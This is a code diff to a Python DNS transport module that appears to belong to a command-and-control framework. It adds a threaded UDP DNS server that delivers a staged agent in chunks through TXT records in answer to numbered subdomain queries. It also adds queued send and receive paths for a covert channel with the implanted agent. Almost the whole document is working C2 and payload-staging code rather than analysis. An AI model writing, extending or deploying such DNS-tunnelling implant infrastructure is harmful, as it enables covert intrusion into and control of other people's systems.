@@ -1,5 +1,8 @@
 import socketserver
 
+import binascii
+import threading
+
 from helpers.dataqueue import DataQueue
 from helpers.encoding import dnsdecode, dnsencode
 from helpers.types import isportnumber, isint
@@ -11,11 +14,13 @@ import dns
 import dns.message
 
 DEBUG_MODULE = "TransportDns"
+MAX_TXT_ENTRY_LEN = 400
 
 class TransportDns (Transport,ModuleBase):
     """ allows and handles DNS query based connections """
 
-    def __init__(self, **kwargs):
+    # noinspection PyMissingConstructor
+    def __init__(self):
         self.options = {
             'ZONE' : {
                 'Description'   :   'DNS Zone for handling requests',
@@ -41,6 +46,7 @@ class TransportDns (Transport,ModuleBase):
         }
         self.server = None
         self.staged = False
+        self.currentstagenum = 0
         self.senddataqueue = DataQueue()
         self.recvdataqueue = DataQueue()
     
@@ -125,6 +131,7 @@ class TransportDns (Transport,ModuleBase):
             return
 
         self.staged = staged
+        self.currentstagenum = 0
 
         # mark backchannel to us from each DnsHandler instance
         DnsHandler.transport = self
@@ -132,7 +139,7 @@ class TransportDns (Transport,ModuleBase):
         lparams = (self.options['LHOST']['Value'], int(self.options['LPORT']['Value']))
 
         self.server = socketserver.UDPServer(lparams, DnsHandler)
-        self.server.serve_forever()
+        threading.Thread(target=self.server.serve_forever).start()
 
         print_message("DNS listening on {}:{}".format(*lparams))
    
@@ -143,13 +150,15 @@ class TransportDns (Transport,ModuleBase):
         :return: None
         """
 
-        # TODO: change to multi connection puzzeling, and to polling based
-
         if not self.server:
             print_error("Connection not open")
             return
 
-        # TODO: self.conn.send(data)
+        # add the data to the send queue
+        self.senddataqueue.add(data)
+
+        # block until send
+        while self.senddataqueue.has_data(): pass
 
     def receive(self, leng=1024):
         """
@@ -158,18 +167,15 @@ class TransportDns (Transport,ModuleBase):
         :return: None
         """
 
-        # TODO: change to multi connection puzzeling
-
         if not self.server:
             print_error("Connection not open")
             return
 
-        # TODOdata = self.conn.recv(leng)
-        # if not data:
-        #    print_error("Connection closed by peer")
-        #    self.close()
-        # return data
-        return b""
+        # if there is no data, block until there is
+        while not self.recvdataqueue.has_data(): pass
+
+        # finish even if less data than requested, higher level must handle this
+        return self.recvdataqueue.get(leng)
 
     def upgradefromstager(self):
         """
@@ -177,10 +183,8 @@ class TransportDns (Transport,ModuleBase):
         :return: None
         """
 
-        # TODO: upgrade stager instead of reopening connection
-        #self.close()
-        #self.open(staged=False)
-        pass
+        # server stays open, we just accept no staging anymore
+        self.staged = False
 
     def upgradetotls(self):
         """
@@ -213,20 +217,109 @@ class TransportDns (Transport,ModuleBase):
         self.server.server_close()
         self.server = None
 
+    def serve_stage(self, stagepartnum):
+        """
+        should serve the next part of the staged agent, if the number matches
+        :param stagepartnum: number of the stager part to get
+        :return: part of the staged agent or None
+        """
+
+        if not self.staged:
+            print_error("stager request for TransportDns but its not staged, dropping")
+            return None
+
+        if self.currentstagenum != stagepartnum:
+            print_debug(DEBUG_MODULE, "request for different stager part number, expected: {}, received: {}".format(
+                self.currentstagenum, stagepartnum))
+            return None # do not answer more than once
+
+        if not self.senddataqueue.has_data():
+            print_debug(DEBUG_MODULE, "out of stager data do send")
+            return None # end of data to send / stager code
+
+        nextdata = self.senddataqueue.get(MAX_TXT_ENTRY_LEN//2)  # encoding adds factor 2 TODO: but what is it?
+        return nextdata
+
 
 class DnsHandler(socketserver.BaseRequestHandler):
     """
     This class is instanciated once per connection and should handle the DNS requests
     """
 
+    # the transport object above, that initiated this
     transport = None
 
+    def __init__(self, request, client_address, server):
+        """
+        initiate a new DNS handler for a request
+        """
+
+        self.zone = self.transport.options["ZONE"]["Value"].rstrip(".")
+        self.stagerrequest = False
+        print_debug(DEBUG_MODULE, "zone = " + str(self.zone))
+        super().__init__(request, client_address, server)
+
+    def _is_in_zone(self, queryname):
+        """
+        tests whether the domain name queried is part of our zone
+        :param queryname: domain name queried
+        :return: True iff it is in our zone
+        """
+
+        return str(queryname).rstrip(".").endswith(self.zone)
+
+    def _decode_query(self, queryname):
+        """
+        decodes the query content according to our specification
+        :param queryname: domain name queried
+        :return: decoded query string or None if decoding failed
+        """
+
+        # strip zone and remove all dots
+        q = str(queryname).rstrip(".").rstrip(self.zone).replace(".", "")
+
+        #print_debug(DEBUG_MODULE, "q = {}, q.startswith('s') = {}, q.strip('s').isdigit() = {}".format(
+        #    q, q.startswith('s'), q.strip('s').isdigit()))
+
+        if q.startswith("s") and q.strip("s").isdigit(): # stager request
+            self.stagerrequest = True
+            return int(q.strip("s")) # we will not decode it
+
+        # otherwise we expect a fully enrolled agent on the other side and decode
+        try:
+            return dnsdecode(q)
+        except binascii.Error:
+            return None
+
+    def _encode_response(self, rdata):
+        """
+        encodes the response data to a form we can include in a DNS response
+        :param rdata: data to include
+        :return: encoded data
+        """
+
+        return dnsencode(rdata)
+
+    def _get_response(self, qtext):
+        """
+        finds the response for the given query text
+        :param qtext: query to respond to (already decoded)
+        :return: response (not yet encoded)
+        """
+
+        if self.stagerrequest: # stager request
+            return self.transport.serve_stage(qtext)
+
+        return qtext  # TODO: for now we just reply
+
     def handle(self):
+        """
+        handles a single DNS request and sends a response
+        :return: None
+        """
+
         data = self.request[0].strip()
         socket = self.request[1]
-
-        zone = self.transport.options["ZONE"]["Value"].rstrip(".")
-        #print_debug(DEBUG_MODULE, "zone = " + str(zone))
 
         msg = dns.message.from_wire(data)
 
@@ -237,22 +330,31 @@ class DnsHandler(socketserver.BaseRequestHandler):
         for q in msg.question:
             print_debug(DEBUG_MODULE, "query from {}: {}".format(self.client_address[0], str(q)))
             if "IN PTR" in str(q):
-                print_debug(DEBUG_MODULE, "ignoring PTR question " + str(q))
+                print_error("ignoring PTR query " + str(q))
+                continue
+            if not self._is_in_zone(q.name):
+                print_error("ignoring query outsite of our zone: " + str(q))
                 continue
 
-            qtext = dnsdecode(str(q.name).rstrip(".").rstrip(zone).replace(".", ""))
+            qtext = self._decode_query(q.name)
+            if qtext == None:
+                print_error("decoding failed for query: " + str(q))
+                continue
+
             print_debug(DEBUG_MODULE, "decoded qtext = {}".format(qtext))
 
             resp = dns.message.make_response(msg)
             resp.flags |= dns.flags.AA
             resp.set_rcode(0)
-            if (resp):
-                data = dnsencode(qtext) # TODO: for now we just reply
-                resp.answer.append(dns.rrset.from_text(q.name, 7600, dns.rdataclass.IN, dns.rdatatype.TXT, str(data, 'utf-8')))
-                print_debug(DEBUG_MODULE, "responding with: {}".format(str(data, 'utf-8')))
-                socket.sendto(resp.to_wire(), self.client_address)
+            if resp:
+                data = self._get_response(qtext)
+                if data:
+                    print_debug(DEBUG_MODULE, "responding with: {}".format(str(data, 'utf-8')))
+                    data = self._encode_response(data)
+                    resp.answer.append(dns.rrset.from_text(q.name, 7600, dns.rdataclass.IN, dns.rdatatype.TXT, str(data, 'utf-8')))
+                    socket.sendto(resp.to_wire(), self.client_address)
+                else:
+                    print_debug(DEBUG_MODULE, "no data to respond, ignoring query")
             else:
                 print_error("error creating response for DNS query: " + msg)
                 return
-
-
